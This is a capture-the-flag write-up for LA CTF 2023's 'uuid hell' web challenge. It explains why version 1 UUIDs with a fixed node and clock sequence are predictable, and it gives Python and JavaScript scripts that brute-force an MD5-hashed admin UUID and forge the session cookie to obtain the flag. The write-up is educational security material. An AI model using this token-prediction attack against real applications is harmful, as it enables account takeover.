# uuid hell

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

- 165 solves / 391 points

## Background

UUIDs are the best! I love them (if you couldn't tell)!

Site: [uuid-hell.lac.tf](https://uuid-hell.lac.tf)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211165520.png)

## Enumeration

**In this challenge, we can download a file:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.11|16:55:39(HKT)]
└> file uuid-hell.zip 
uuid-hell.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.11|16:55:40(HKT)]
└> unzip uuid-hell.zip          
Archive:  uuid-hell.zip
  inflating: Dockerfile              
  inflating: package-lock.json       
  inflating: package.json            
  inflating: server.js
```

But before we look into those files, let's have a look in the home page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211165644.png)

As you can see, we have bunch of UUIDs for admin users and regular users.

**Now, we can look into the downloaded files.**

**Dockerfile:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.11|16:56:06(HKT)]
└> cat Dockerfile 
FROM node:19-bullseye-slim
ENV NODE_ENV=production
ENV PORT=3500
ENV FLAG=lactf{testing}

WORKDIR /app

COPY ["package.json", "package-lock.json", "./"]

RUN npm install --production

COPY server.js /app

EXPOSE 3500

CMD [ "node", "server.js"]
```

In here, we see that the web application is using Express NodeJS framework, and **the flag is inside the environment variable.**

Let's break the `server.js` JavaScript source code down!

**In the source code, we see this:**
```js
function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
let adminuuids = []
let useruuids = []
function isAdmin(uuid) {
    return adminuuids.includes(uuid);
}
function isUuid(uuid) {
    if (uuid.length != 36) {
        return false;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            return false;
        }
    }
    return true;
}

function getUsers() {
    let output = "<strong>Admin users:</strong>\n";
    adminuuids.forEach((adminuuid) => {
        const hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    output += "<br><br><strong>Regular users:</strong>\n";
    useruuids.forEach((useruuid) => {
        const hash = crypto.createHash('md5').update(useruuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    return output;

}
[...]
app.get('/', (req, res) => {
    let id = req.cookies['id'];
    if (id === undefined || !isUuid(id)) {
        id = randomUUID();
        res.cookie("id", id);
        useruuids.push(id);
    } else if (isAdmin(id)) {
        res.send(process.env.FLAG);
        return;
    }

    res.send("You are logged in as " + id + "<br><br>" + getUsers());
});
```

In the `/` route (path), if our cookie `id` is not set OR the `id` value length is not equal to 36, and not contain `-a-f0-9`, then generate a new **random UUID version 1** and set a new `id` cookie with that value.

***If the UUID value is the admin user one, send the flag.***

Finally, for each admin users' UUID, **MD5 hash it by appending "admin" and the UUID.** Also, for each regular users' UUID, MD5 hash it with the UUID.

**After that, we can also see:**
```js
app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});
```

**In the `/createadmin` route, **when a POST request is sent, it'll generate a new UUID version 1**, and append it to array `adminuuids`:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.11|17:17:41(HKT)]
└> curl https://uuid-hell.lac.tf/createadmin -X POST
Admin account created.
```

So, what's our goal in this challenge?

***Our main goal is to get a valid UUID from one of those admin users, then the web application will send the flag!***

But how?

The admin UUIDs are being hashed via MD5 and appended a string "admin".

**Let's look at the function `randomUUID()`:**
```js
function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
```

First off, what is UUID version 1?

> A Version 1 UUID is **a universally unique identifier that is generated using a timestamp and the MAC address (`node`) of the computer on which it was generated**.

**Then, according to [NPM](https://www.npmjs.com/package/uuid#uuidv1options-buffer-offset), we see that what is `node` and `clockseq` key:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211172525.png)

So, `node` is 6 indexes of array of byte values. `clockseq` is a number between 0 - 0x3fff.

Hmm... If we can extract **timestamp**, **clock sequence** and **node** (MAC address), we can predict the UUID!

**In [this](https://versprite.com/blog/universally-unique-identifiers/) blog, it breaks down the UUIDv1 and it's vulnerability:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211173340.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211173350.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211173401.png)

**Hence, our current UUID:**

- Timestamp: 1eda9e3ab25e090 (`ab25e090`-`a9e3`-1`1ed`-aa64-67696e6b6f69)
    - Hex to decimal: 138953958812410000
    - Subtracted: 1676103081241 ( ${138953958812410000} - {122192928000000000} / 10000$ )
    - Converted: Sat Feb 11 2023 16:11:21 GMT+0800 (From [Dan's Tool](https://www.unixtimestamp.com/))
- Version: 1 (ab25e090-a9e3-`1`1ed-aa64-67696e6b6f69)
- Clock Sequence / Clock ID: aa64 (ab25e090-a9e3-11ed-`aa64`-67696e6b6f69) (`0b10101001100100`)
- Node ID: 67696e6b6f69 (ab25e090-a9e3-11ed-aa64-`67696e6b6f69`) (`[0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69]`)

Hmm... How can we abuse the `/createadmin` route...

***Ah! Since we now know the format of UUIDv1, the value of node, and clock sequence, we can theoretically predict the admin UUID!***

**To so do, I'll write a Python script:**
```py
#!/usr/bin/env python3

import requests
from hashlib import md5
from uuid import uuid1

def main():
    session = requests.session()

    # Create new admin
    URL = 'https://uuid-hell.lac.tf'
    createAdminRequestResult = session.post(URL + '/createadmin')
    print(f'[+] Request result text: {createAdminRequestResult.text}')

    UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
    print(f'[+] UUIDv1: {UUIDv1}')
    
    hashedUUIDv1 = md5(b'admin' + UUIDv1.encode('utf-8')).hexdigest()
    print(f'[+] Hashed: {hashedUUIDv1}')
   
    homePageRequestResult = session.get(URL)
    print(homePageRequestResult.text.split('<br><br><strong>')[0])
    if hashedUUIDv1 in homePageRequestResult.text:
        print('[+] Found the same hash in the home page!')
    else:
        print('[-] Couldn\'t find the same hash in the home page...')


if __name__ == '__main__':
    main()
```

However, I still couldn't predict the UUID in this script...

Hmm... I wonder if can I ***brute force the admin UUID's MD5 hash***...

**To do so, I'll first generate a UUIDv1 BEFORE creating a new admin account. Then, get the regular user's UUIDv1 AFTER new admin account has been created:**
```js
const uuid = require('uuid');
const crypto = require('crypto');

const URL = 'https://uuid-hell.lac.tf';

// Generate UUIDv1 and MD5 hashed one
var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
console.log("Before created UUIDv1: " + adminuuid);
var hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
console.log("Before created MD5 hash: " + hash);

// Create new admin
fetch(URL + "/createadmin", {
    method: "POST"
}).then(
        response => response.text()
    ).then(
        text => console.log("Create admin response text: " + text)
    );

// Get the current regular user's UUIDv1
fetch(URL).then(
        response => response.text()
    ).then(
        text => console.log("Current regular user's UUIDv1:\n" + text.split('<br><br><strong>')[0])
    );
```

> Note: I switch to JavaScript for simplicity.

```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.12|14:12:43(HKT)]
└> nodejs generate_uuidv1.js
Before created UUIDv1: 8c07b990-aa9c-11ed-aa64-67696e6b6f69
Before created MD5 hash: eb3b9bac7f6b78cb5ea2895fc0331772
Current regular user's UUIDv1:
You are logged in as 8c69d6c0-aa9c-11ed-aa64-67696e6b6f69
Create admin response text: Admin account created.
```

**Then, go to `/`, and copy the last admin user's hash:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230212141551.png)

**After that, I'll write a Python script to brute force the MD5 hash:**
```py
#!/usr/bin/env python3

from hashlib import md5

def main():
    hashed = '9d91ed0ca14c3863eb27546c83e25358'

    for i in range(0x8c07b990 , 0xffffffff):
        hexed = hex(i)[2:]
        hashTarget = f'{hexed}-aa9c-11ed-aa64-67696e6b6f69'.encode('utf-8')

        hashedTarget = md5(b'admin' + hashTarget).hexdigest()
        print(f'[*] Trying target: {hashTarget.decode()}, hashed: {hashedTarget}', end='\r')
        if hashedTarget == hashed:
            print(f'\n[+] Found the same hash! Target: {hashTarget.decode()}, hashed: {hashedTarget}')
            exit()

if __name__ == '__main__':
    main()
```

> Note: Replace the `hashed` to your last admin user's hash, and the `0x8c07b990` hex value to your before created UUIDv1. E.g: `8c07b990-aa9c-11ed-aa64-67696e6b6f69` -> `0x8c07b990`.

```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/uuid-hell)-[2023.02.12|14:20:52(HKT)]
└> python3 brute_force_md5_uuidv1.py
[*] Trying target: 8c78cae0-aa9c-11ed-aa64-67696e6b6f69, hashed: 9d91ed0ca14c3863eb27546c83e25358
[+] Found the same hash! Target: 8c78cae0-aa9c-11ed-aa64-67696e6b6f69, hashed: 9d91ed0ca14c3863eb27546c83e25358
```

Nice! We found it!

**Let's modify our `id` cookie to the new UUIDv1, and refresh the page!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230212142605.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230212142613.png)

We found the flag!

- **Flag: `lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}`**

# Conclusion

What we've learned:

1. Predicting UUID Version 1 Via Known Nodes & Clock Sequence